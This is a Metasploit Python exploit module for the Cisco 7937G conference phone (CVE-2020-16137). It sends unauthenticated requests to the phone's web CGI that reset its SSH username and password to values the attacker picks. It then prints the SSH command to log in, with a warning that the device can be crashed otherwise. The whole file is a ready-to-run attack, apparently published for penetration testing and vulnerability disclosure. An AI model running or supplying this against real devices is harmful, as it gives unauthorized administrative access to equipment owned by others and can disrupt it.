#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from metasploit import module
import logging

# extra modules
dependency_missing = False

try:
    import requests
except ImportError:
    dependency_missing = True


metadata = {
    'name': 'Cisco 7937G SSH Privilege Escalation',
    'description': '''
	This module exploits a feature that should not be available 
	via the web interface. An unauthenticated user may change 
	the credentials for SSH access to any username and password 
	combination desired, giving access to administrative 
	functions through an SSH connection.
    ''',
    'authors': [
        'Cody Martin'
	# Author Homepage: debifrank.github.io
	# Organization: BlackLanternSecurity
	# Org. Homepage: BlackLanternSecurity.com
    ],
    'date': '2020-06-02',
    'license': 'GPL_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://blacklanternsecurity.com/2020-08-07-Cisco-Unified-IP-Conference-Station-7937G/'},
        {'type': 'cve', 'ref': '2020-16137'}
    ],
    'type': 'single_scanner',
    'options': {
        'rhost': {'type': 'address', 
		'description': 'Target address', 
		'required': True, 
		'default': ''},
        'USER': {'type': 'string', 
		'description': 'Desired username', 
		'required': True, 
		'default': ''},
        'PASS': {'type': 'string', 
		'description': 'Desired password', 
		'required': True, 
		'default': ''},
        'TIMEOUT': {'type': 'int', 
		'description': 'Timeout in seconds', 
		'required': True, 
		'default': 5}
    }
}


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependency_missing:
        logging.error('Python module dependency (requests) is missing, cannot continue')
        logging.error('Please execute pip3 install requests.')
        return

    url = "http://{}/localmenus.cgi".format(args['rhost'])
    payload_user = {"func": "403", "set": "401",
                    "name1": args['USER'], "name2": args['USER']}
    payload_pass = {"func": "403", "set": "402",
                    "pwd1": args['PASS'], "pwd2": args['PASS']}
    logging.info("Attempting to set SSH credentials.")
    try:
        r = requests.post(url=url, params=payload_user,
                          timeout=int(args['TIMEOUT']))
        if r.status_code != 200:
            logging.error("Device doesn't appear to be functioning or web access is not enabled.")
            return

        r = requests.post(url=url, params=payload_pass, timeout=int(args['TIMEOUT']))
        if r.status_code != 200:
            logging.error("Device doesn't appear to be functioning or web access is not enabled.")
            return
    except requests.exceptions.RequestException:
        logging.error("Device doesn't appear to be functioning or web access is not enabled.")
        return

    logging.info("SSH attack finished!")
    logging.info(("Try to login using the supplied credentials {}:{}").format(
        args['USER'], args['PASS']))
    logging.info("You must specify the key exchange when connecting or the device will be DoS'd!")
    logging.info(("ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 {}@{}").format(args['USER'], args['rhost']))
    return


if __name__ == "__main__":
    module.run(metadata, run)
